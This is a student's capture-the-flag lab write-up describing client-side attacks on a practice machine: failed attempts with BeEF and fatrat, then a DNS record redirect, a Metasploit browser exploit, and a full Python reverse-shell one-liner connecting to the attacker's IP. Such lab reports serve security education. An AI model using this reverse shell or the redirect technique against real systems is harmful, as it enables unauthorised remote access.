flag{5d402e}: Start DATATIME: Sunday End DATATIME: Tuesday. Total time spend: 3h
For this flag I just spend lot of time searching for differet ways of performing client-side attacks.
Work without results:
First I treid to know how to use BeEF by installing it and tried to connect to one IP Adress but I didnt managed
do it so I tried other things. The second thing I tried was using fatrat as I found one youtube video that seemed 
interessting to perform client-side attack but at one point I didnt know how to manage using metasploit and fatrat
at the same time to achive the client-side attack. 

Work with results:
So after lots of hours searching inside the sea turtle machine I found that maybe I could redirect one of the ip that is 
in /etc/php-dns/dns_records.json to my personal IP adress of my computer and I typed :
                                systemctl restart php-dns in sea turtle
After that I just opened msfconsole in my local machine and typed search webidl to see all the modules aviable and exploit 
the machine. So after that I put different commands to prepare the machine with different sets such as:
                                          use 0
                                          set SRVPORT 80
                                          set URIPATH 
                                          set LHOST 192.168.0.6
And just run to exploit the machine. Before that, I prepared a command for a reverse shell and a listener with netcat.
After that, returning to the msfconsole I put sessions -i l and then I used the same pyhton script as one of the previous flags 
to catch incoming requests:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.6",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
So then I returned to my reverse shell and I was connected. I just had to use the cd command to different folders and
had the flag in any of them.
